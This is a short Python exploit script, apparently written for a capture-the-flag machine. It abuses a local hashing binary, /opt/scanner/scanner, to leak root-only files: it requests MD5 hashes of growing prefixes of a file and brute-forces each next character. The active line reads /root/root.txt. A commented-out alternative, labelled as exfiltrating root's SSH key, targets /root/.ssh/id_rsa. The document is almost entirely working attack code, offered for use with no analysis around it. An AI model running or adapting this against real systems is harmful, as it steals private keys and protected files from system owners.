import hashlib
import string
import subprocess

charset = string.printable
# uncomment the line below to exfil root's ssh key
#list_of_hashes = subprocess.check_output(["/bin/bash", "-c",  "for i in $(seq 1 2655); do /opt/scanner/scanner -c /root/.ssh/id_rsa -p -s a -l $i 2>/dev/null | awk -F' ' '{print $5}'; done"]).decode().split()
# uncomment the line below to exfil root.txt
list_of_hashes = subprocess.check_output(["/bin/bash", "-c",  "for i in $(seq 1 33); do /opt/scanner/scanner -c /root/root.txt -p -s a -l $i 2>/dev/null | awk -F' ' '{print $5}'; done"]).decode().split()

def gen_md5(char):
  return hashlib.md5(char.encode()).hexdigest()

flag = ""
for hash in list_of_hashes:
  for c in charset:
    test_flag = flag + c
    test_hash = gen_md5(test_flag)
    if test_hash == hash:
      flag += c
print("\nOutput: \n" + test_flag)
